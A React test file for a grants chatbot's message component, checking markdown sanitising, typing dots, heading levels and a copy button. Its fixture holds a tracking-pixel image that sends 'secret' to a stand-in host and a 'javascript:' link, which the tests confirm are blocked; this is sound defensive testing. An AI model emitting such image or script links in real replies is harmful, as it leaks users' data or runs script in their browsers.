import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { renderApp } from "../../test/render";
import ChatMessage from "./ChatMessage";
import { ChatBotMessageType } from "./types";

const REPLY = [
  "![tracking pixel](https://evil.example/pixel.png?d=secret)",
  "[js](javascript:alert(1)) [plain](http://insecure.example) [secure](https://grants.gov/x) [mail](mailto:help@example.org)",
].join("\n\n");

describe("ChatMessage markdown", () => {
  it("shows image alt text instead of loading images and keeps only https and mailto links", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: REPLY, metadata: {} }} />
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("tracking pixel")).toBeInTheDocument();

    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://grants.gov/x", "mailto:help@example.org"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a).toHaveAttribute("rel", "noopener noreferrer");
    }
    expect(container.textContent).toMatch(/js plain secure \(opens in new tab\) mail/);
    expect(container.innerHTML).not.toMatch(/javascript:|insecure\.example|evil\.example/);
  });
});

describe("ChatMessage waiting", () => {
  it("shows hidden typing dots, and no copy button, until the answer has text", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: "", metadata: {} }} />
    );

    const dots = container.querySelector("[aria-hidden='true'] > span:nth-child(3)")?.parentElement;
    expect(dots?.children).toHaveLength(3);
    expect(screen.getByText("Assistant is typing")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Copy/ })).not.toBeInTheDocument();
  });
});

describe("ChatMessage reply", () => {
  const reply = () =>
    renderApp(
      <ChatMessage
        replyNumber={3}
        message={{
          type: ChatBotMessageType.AI,
          content: "# Summary\n\n## Budget\n\nText",
          metadata: { Sources: [{ title: "NOFO.pdf", uri: "s3://bucket/nofo.pdf" }] },
        }}
      />
    );

  it("is an article named after its number, with headings from h2 and no sources list (the panel has them)", () => {
    reply();
    expect(screen.getByRole("article", { name: "Answer 3" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 2, name: "Summary" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 3, name: "Budget" })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Sources/ })).toBeNull();
  });

  it("copies the answer, says so, and shows its name as a tooltip that Escape dismisses", async () => {
    const { user } = reply();
    const copy = screen.getByRole("button", { name: "Copy answer 3" });

    await user.hover(copy);
    expect(screen.getByText("Copy answer 3", { selector: ".gw-tip__bubble" })).toBeInTheDocument();
    await user.keyboard("{Escape}");
    expect(document.querySelector(".gw-tip__bubble")).toBeNull();

    await user.click(copy);
    expect(await navigator.clipboard.readText()).toBe("# Summary\n\n## Budget\n\nText");
    expect(screen.getByRole("status")).toHaveTextContent("Copied");
  });

  it("shows the user's own turn as text", () => {
    renderApp(<ChatMessage message={{ type: ChatBotMessageType.Human, content: "When is it due?", metadata: {} }} />);
    expect(screen.getByText("When is it due?")).toBeInTheDocument();
    expect(screen.queryByRole("article")).toBeNull();
  });
});

